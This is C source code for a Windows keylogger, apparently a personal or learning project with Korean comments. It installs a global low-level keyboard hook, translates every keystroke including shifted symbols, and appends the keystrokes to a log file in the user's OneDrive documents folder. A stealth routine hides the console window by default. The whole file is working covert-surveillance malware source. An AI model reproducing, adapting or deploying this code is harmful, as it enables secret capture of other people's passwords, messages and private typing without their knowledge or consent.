#define UNICODE
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>


#define INVISIBLE 

static const struct {
    int key;
    const char* name;
} keyname[] = {
    {VK_BACK, "[BACKSPACE]"},
    {VK_RETURN, "\n"},
    {VK_SPACE, " "},
    {VK_TAB, "[TAB]"},
    {VK_SHIFT, ""},
    {VK_LSHIFT, ""},
    {VK_RSHIFT, ""},
    {VK_CONTROL, "[CTRL+"},
    {VK_LCONTROL, "[CTRL+"},
    {VK_RCONTROL, "[CTRL+"},
    {VK_MENU, "[ALT]"},
    {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_CAPITAL, "[CAPSLOCK]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"}
};

HHOOK _hook;

int ctrl = 0;
int shift = 0;
// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

//int Save(int key_stroke);
FILE* output_file;

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    int i;
    int key_stroke;
    char output[256];
    

    if (nCode >= 0)
    {
        // the action is valid: HC_ACTION.
        //if (wParam == WM_KEYDOWN)
        //{
        // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
        
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

        key_stroke = kbdStruct.vkCode;
        HWND foreground = GetForegroundWindow();
        DWORD threadID;
        HKL layout = NULL;

        if (foreground)
        {
            // get keyboard layout of the thread
            threadID = GetWindowThreadProcessId(foreground, NULL);
            layout = GetKeyboardLayout(threadID);
        }

        //part1
        if (foreground)
        {
            char window_title[256];
            GetWindowTextA(foreground, (LPSTR)window_title, 256);
        }
        
        if (wParam == WM_KEYUP) {
            switch (key_stroke) {
            case VK_LCONTROL:
            case VK_RCONTROL:
                if (ctrl) {
                    printf("]");
                    fputs("]", output_file);
                    
                    ctrl = FALSE;
                }
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
                shift = FALSE;
                break;
            }

        }
        
        if (wParam == WM_KEYDOWN) 
        {

           

            switch (key_stroke) {
            case VK_LCONTROL:
            case VK_RCONTROL:
                if (!ctrl) {
                    ctrl = TRUE;
                }
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
                shift = TRUE;
                break;
            }

            for (i = 0; i < sizeof(keyname) / sizeof(keyname[0]); i++)
            {
                if (keyname[i].key == key_stroke)
                {
                    sprintf(output, "%s", keyname[i].name); 
                    break;
                }
            }

            

            if (i == sizeof(keyname) / sizeof(keyname[0]))
            {

                char key;
                key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

                if (shift && isdigit(key_stroke)) {
                    
                    switch (key - 48) {
                    case 1:
                        key = '!';
                        break;
                    case 2:
                        key = '@';
                        break;
                    case 3:
                        key = '#';
                        break;
                    case 4:
                        key = '$';
                        break;
                    case 5:
                        key = '%';
                        break;
                    case 6:
                        key = '^';
                        break;
                    case 7:
                        key = '&';
                        break;
                    case 8:
                        key = '*';
                        break;
                    case 9:
                        key = '(';
                        break;
                    case 0:
                        key = ')';
                        break;
                    }
                }
                else if (!isalpha(key_stroke) && shift)
                {
                    switch (key_stroke) {
                    case VK_OEM_PLUS:
                        key = '+';
                        break;
                    case VK_OEM_MINUS:
                        key = '_';
                        break;
                    case VK_OEM_PERIOD:
                        key = '>';
                        break;
                    case VK_OEM_2:
                        key = '?';
                        break;
                    case VK_OEM_COMMA:
                        key = '<';
                        break;
                    case VK_OEM_1:
                        key = ':';
                        break;
                    case VK_OEM_3:
                        key = '~';
                        break;
                    case VK_OEM_4:
                        key = '{';
                        break;
                    case VK_OEM_5:
                        key = '|';
                        break;
                    case VK_OEM_6:
                        key = '}';
                        break; 
                    case VK_OEM_7:
                        key = '"';
                        break;
                    default:
                        
                        break;
                    }
                }

                else {
                    int lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

                    // check shift key
                    if (shift)
                    {
                        lowercase = !lowercase;
                    }

                   
                    if (!lowercase)
                    {
                        key = tolower(key);
                    }
                    //sprintf(output, "%c", key);
                
                }
                sprintf(output, "%c", key);
               
            }
            // instead of opening and closing file handlers every time, keep file open and flush.
            fputs(output, output_file);
            fflush(output_file);

            printf("%s", output);
        }
        
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() //후킹이 실패하였을 때 사용자에게 오류 메시지 표시함.
{
   
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

void Stealth()
{
#ifdef VISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef INVISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif
}

int main()
{
    
    const char* output_filename = "keylogger_f.log";
    printf("Logging output to %s\n", output_filename);
    output_file = output_file = fopen("C:\\Users\\goodr\\OneDrive\\문서\\keylogger_f.txt", "a");

    // visibility of window
    Stealth();

    // set the hook
    SetHook();

    // loop to keep the console application running.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}